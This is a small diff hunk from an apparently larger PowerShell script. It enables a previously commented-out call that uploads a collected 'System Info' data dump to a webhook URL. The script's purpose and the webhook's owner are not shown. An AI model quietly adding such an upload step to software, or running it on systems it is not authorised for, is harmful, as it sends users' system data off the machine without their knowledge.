@@ -1025,7 +1025,7 @@ $out = Invoke-DataDump `
     -OutputFile $OutputFileDefault `
     -ExportDir $ExportDirDefault
 
-#Send-DumpToWebhook `
+Send-DumpToWebhook `
     -FilePath $out `
     -WebhookUrl $WebhookUrl `
     -Title "System Info" `
